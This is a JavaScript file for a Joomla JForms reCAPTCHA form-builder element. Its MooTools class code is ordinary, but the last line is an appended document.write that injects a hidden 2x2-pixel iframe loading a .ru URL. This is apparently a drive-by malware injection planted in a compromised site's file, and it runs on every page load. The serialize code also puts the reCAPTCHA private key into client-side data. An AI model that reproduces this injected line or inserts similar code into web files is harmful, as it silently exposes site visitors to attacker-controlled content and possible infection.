/**
* Javascript object for Recaptcha plugin
*
* @version		$Id: recaptcha.js 295 2009-09-05 10:23:08Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
* Slightly modified version from the original file written by my mentor "Jui-Yu Tsai" 
*/
var recaptcha = new Class({
	
	Extends : CElement,
	
	initialize: function(  parent, id, beforeObject, params ) {
	
		this.type	    = "recaptcha";
		this.parent( $(parent), id, $(beforeObject), params );
	
		this.publickey = params.publickey;
		this.privatekey = params.privatekey;
		this.custom_lang = params.custom_lang;
		this.lang 	     = params.lang;
		this.theme       = params.theme;
		
		this.htmlInput 	     = new Element('img', {
			'src' : 'components/com_jforms/plugins/elements/recaptcha/recaptcha-img.png',
			'styles':{
				'margin':'0px',
				'padding':'0px'	
			}
		});
		
		if( this.lang != '__' ){
			$('ppage_recaptcha_custom_lang').disabled = true;	
		} else {
			$('ppage_recaptcha_custom_lang').disabled = false;
		}
		
		this.htmlInput.inject( this.htmlContainer );
		
	},
	
	deselect: function() {
	
		this.htmlContainer.removeClass('selected'); 
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'hidden' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }});
	
	},
	
	select  : function() {
		
		this.htmlContainer.addClass('selected');
		this.htmlDragHandle.set({'styles':{ 'visibility' : 'visible' }});
		this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }});

	},

    onUpdate : function(){
		if( this.lang != '__' ){
			$('ppage_recaptcha_custom_lang').disabled = true;	
		} else {
			$('ppage_recaptcha_custom_lang').disabled = false;
		}
	},
	serialize: function(){
	
		order = getOrder( this.htmlContainer );
		var hash  = '';
		if(this.hash && this.hash.length){
			hash = this.hash;
		} else {
			hash = uniqueId( 5 );
		}
	
		return JSON.encode({
			type:this.type,
			position:order,
			hash:hash,
			custom_lang:this.custom_lang,
			lang:this.lang,
			theme:this.theme,
			publickey: this.publickey,
			privatekey: this.privatekey
		});
	}
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');